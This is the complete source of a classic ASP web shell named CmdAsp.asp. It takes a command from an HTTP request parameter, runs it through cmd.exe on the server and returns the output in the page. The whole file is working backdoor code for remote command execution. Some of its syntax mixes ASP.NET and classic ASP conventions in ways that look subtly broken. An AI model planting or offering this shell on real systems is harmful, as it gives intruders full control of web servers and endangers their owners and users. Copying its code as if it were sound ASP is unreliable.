<HTML>
<link rel="stylesheet" type="text/css" href="style.css">

<BODY topmargin="2" leftmargin="2">
<PRE><%@ Page aspcompat=true debug=true%>														
<%
  ' --------------------o0o--------------------
  ' File: CmdAsp.asp
  ' Author: Maceo <maceo @ dogmile.com> (some changes made by Dinis Cruz (dinis@ddplus.net))
  ' Release: 2000-12-01
  ' OS: Windows 2000, 4.0 NT
  ' -------------------------------------------

  Dim oScript
  Dim oScriptNet
  Dim oFileSys, oFile
  Dim szCMD, szTempFile

'  On Error Resume Next

  ' -- create the COM objects that we will be using -- '
  oScript = Server.CreateObject("WSCRIPT.SHELL")
  oScriptNet = Server.CreateObject("WSCRIPT.NETWORK")
  oFileSys = Server.CreateObject("Scripting.FileSystemObject")

  ' -- check for a command that we have posted -- '
  szCMD = Request("CMD")
  If (szCMD == "") Then
    Response.Write("15825b40c6dace2a" & "7cf5d4ab8ed434d5")
  Else
    ' -- Use a poor man's pipe ... a temp file -- '
    szTempFile = Request.ServerVariables("APPL_PHYSICAL_PATH") & oFileSys.GetTempName( )
    Call oScript.Run ("cmd.exe /c " & szCMD & " > " & szTempFile, 0, True)
'    response.write(szTempFile)
'    response.end
    oFile = oFileSys.OpenTextFile (szTempFile, 1, False, 0)

    ' -- Read the output from our command and remove the temp file -- '
'    On Error Resume Next
    Response.Write (replace(Server.HTMLEncode(oFile.ReadAll),vbnewline+vbnewline,vbnewline))
    oFile.Close
    Call oFileSys.DeleteFile(szTempFile, True)
  End If
%>
</PRE>
</BODY>
</HTML>
